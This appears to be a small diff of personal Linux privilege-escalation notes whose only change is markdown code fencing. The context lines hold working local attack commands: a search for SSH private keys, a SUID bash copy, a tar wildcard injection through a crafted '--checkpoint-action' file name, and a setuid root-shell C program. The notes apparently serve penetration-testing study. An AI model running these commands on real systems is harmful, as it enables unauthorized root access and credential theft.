@@ -45,7 +45,8 @@ Finding ssh keys - find / -name id_rsa 2> /dev/null
 echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p" > file
 
 cron wildcards
-'''
+
+```
 
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
 
@@ -55,7 +56,8 @@ touch /home/user/--checkpoint-action=exec=sh\ runme.sh
 
 /tmp/bash -p
 
-'''
+```
+
 echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
 
 
